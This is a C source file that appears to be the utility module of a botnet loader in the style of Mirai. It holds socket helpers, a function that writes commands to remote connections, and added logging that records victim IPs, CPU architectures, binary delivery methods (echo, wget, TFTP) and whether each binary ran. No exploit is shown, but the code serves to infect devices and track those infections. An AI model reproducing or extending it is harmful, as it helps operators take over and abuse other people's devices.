#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

#include "headers/includes.h"
#include "headers/util.h"
#include <time.h>
#include <sys/time.h>
#include "headers/server.h"

int util_socket_and_bind(struct server *srv)
{
    struct sockaddr_in bind_addr;
    int i = 0, fd = 0, start_addr = 0;
    BOOL bound = FALSE;

    if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return -1;

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = 0;

    start_addr = rand() % srv->bind_addrs_len;
    for(i = 0; i < srv->bind_addrs_len; i++)
    {
        bind_addr.sin_addr.s_addr = srv->bind_addrs[start_addr];
        if(bind(fd, (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
        {
            if(++start_addr == srv->bind_addrs_len)
                start_addr = 0;
        }
        else
        {
            bound = TRUE;
            break;
        }
    }
    if(!bound)
    {
        close(fd);
        #ifdef DEBUG
            printf("Failed to bind on any address\n");
        #endif
        return -1;
    }

    // Set the socket in nonblocking mode
    if(fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK) == -1)
    {
        #ifdef DEBUG
            printf("Failed to set socket in nonblocking mode. This will have SERIOUS performance implications\n");
        #endif
    }

    return fd;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i = 0, matched = 0;

    if(mem_len > buf_len)
        return -1;

    for(i = 0; i < buf_len; i++)
    {
        if(buf[i] == mem[matched])
        {
            if(++matched == mem_len)
            {
                return i + 1;
            }
        }
        else
            matched = 0;
    }

    return -1;
}

BOOL util_sockprintf(int fd, const char *fmt, ...)
{
    char buffer[BUFFER_SIZE + 2];
    va_list args;
    int len = 0;

    va_start(args, fmt);
    len = vsnprintf(buffer, BUFFER_SIZE, fmt, args);
    va_end(args);

    if(len > 0)
    {
        if(len > BUFFER_SIZE)
            len = BUFFER_SIZE;

        #ifdef DEBUG
            printf("writing %s", buffer);
        #endif

        if(send(fd, buffer, len, MSG_NOSIGNAL) != len)
            return FALSE;
    }

    return TRUE;
}

// Enhanced debugging and monitoring functions
void debug_log(const char *format, ...)
{
    if (!DEBUG_ENABLED) return;
    
    FILE *log_file = fopen(LOG_FILE, "a");
    if (log_file == NULL) return;
    
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    
    fprintf(log_file, "[%s] ", timestamp);
    
    va_list args;
    va_start(args, format);
    vfprintf(log_file, format, args);
    va_end(args);
    
    fprintf(log_file, "\n");
    fclose(log_file);
}

void execution_track(const char *ip, const char *arch, const char *status, const char *details)
{
    FILE *exec_file = fopen(EXECUTION_LOG, "a");
    if (exec_file == NULL) return;
    
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    
    fprintf(exec_file, "[%s] IP: %s | ARCH: %s | STATUS: %s | DETAILS: %s\n", 
            timestamp, ip, arch, status, details);
    fclose(exec_file);
}

void connection_monitor(const char *ip, const char *arch, const char *action, int result)
{
    FILE *conn_file = fopen(CONNECTION_LOG, "a");
    if (conn_file == NULL) return;
    
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    
    fprintf(conn_file, "[%s] IP: %s | ARCH: %s | ACTION: %s | RESULT: %d\n", 
            timestamp, ip, arch, action, result);
    fclose(conn_file);
}

void log_binary_execution(const char *ip, const char *arch, const char *binary_path, int success)
{
    char details[512];
    snprintf(details, sizeof(details), "Binary: %s | Success: %s", 
             binary_path, success ? "YES" : "NO");
    
    execution_track(ip, arch, success ? EXEC_SUCCESS : EXEC_FAILED, details);
    debug_log("Binary execution: IP=%s, ARCH=%s, Binary=%s, Success=%d", 
              ip, arch, binary_path, success);
}

void log_download_status(const char *ip, const char *arch, const char *method, int success)
{
    char details[512];
    snprintf(details, sizeof(details), "Method: %s | Success: %s", 
             method, success ? "YES" : "NO");
    
    execution_track(ip, arch, success ? DOWNLOAD_SUCCESS : DOWNLOAD_FAILED, details);
    debug_log("Download status: IP=%s, ARCH=%s, Method=%s, Success=%d", 
              ip, arch, method, success);
}

void log_connection_attempt(const char *ip, const char *arch, const char *action, int result)
{
    connection_monitor(ip, arch, action, result);
    debug_log("Connection attempt: IP=%s, ARCH=%s, Action=%s, Result=%d", 
              ip, arch, action, result);
}

// Performance monitoring
void log_performance_metrics(struct server *srv)
{
    if (!DEBUG_ENABLED) return;
    
    debug_log("PERFORMANCE METRICS - Open: %d, Successes: %d, Echoes: %d, Wgets: %d, TFTPs: %d, Failures: %d",
              ATOMIC_GET(&srv->curr_open),
              ATOMIC_GET(&srv->total_successes),
              ATOMIC_GET(&srv->total_echoes),
              ATOMIC_GET(&srv->total_wgets),
              ATOMIC_GET(&srv->total_tftps),
              ATOMIC_GET(&srv->total_failures));
}

char *util_trim(char *str)
{
    char *end;

    while(isspace(*str))
        str++;

    if(*str == 0)
        return str;

    end = str + strlen(str) - 1;
    while(end > str && isspace(*end))
        end--;

    *(end+1) = 0;

    return str;
}
